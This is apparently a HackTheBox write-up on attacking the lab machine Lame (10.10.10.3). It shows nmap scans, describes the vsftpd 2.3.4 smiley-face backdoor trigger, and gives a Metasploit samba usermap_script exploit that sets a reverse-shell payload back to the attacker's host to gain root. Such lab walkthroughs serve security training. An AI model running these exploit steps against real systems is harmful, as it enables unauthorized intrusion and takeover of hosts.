This writeup details attacking the machine Lame (10.10.10.3) on [HackTheBox](www.hackthebox.eu).

Enumeration
-----------
First things first, as with any machine, we want to nmap scan it to see what ports are open.  
```bash
root@kali:~/reboare.github.io/_posts# nmap -p- 10.10.10.3 -T4

Nmap scan report for 10.10.10.3
Host is up (0.062s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 437.65 seconds
```
So we have a bunch of ports open, the next step is to perform a more in depth scan on these ports.

```bash
root@kali:~/reboare.github.io/_posts# nmap -p 21,22,139,445,3632 10.10.10.3 -A

THe first target that looks like it would be exploitable is the ftp server version, vsftpd 2.3.4.  For those who don't know, this version of vsftpd was compromised, not via the source code, but by an exploitable version being uploaded to the master site.  Exploiting it is as simple as sending a smiley-face ':)' as the username credential.  This will then open a shell on port 6200.  

However, a quick and dirty test reveals that this method doesn't work.
```bash
root@kali:~# ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)

Since there was no fix to the source code, fixing this vulnerability didn't necessitate a version change.  This was just placed as a red-herring.

So with that failing lets attempt to attack the samba service.  We can see from the namp scan that it's running version 3.0.20, so lets check metasploit to see if anything pops up.

```bash
msf > search samba

Quite a few exploits for samba, but doing some research reveals that samba/usermap_script targets versions `3.0.20 through 3.0.25rc3`.  So lets try that one.
```bash
msf > use exploit/multi/samba/usermap_script 
msf exploit(usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

msf exploit(usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf exploit(usermap_script) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(usermap_script) > set LHOST 10.10.13.126
LHOST => 10.10.13.126

msf exploit(usermap_script) > exploit

```
It works and we have a root shell.
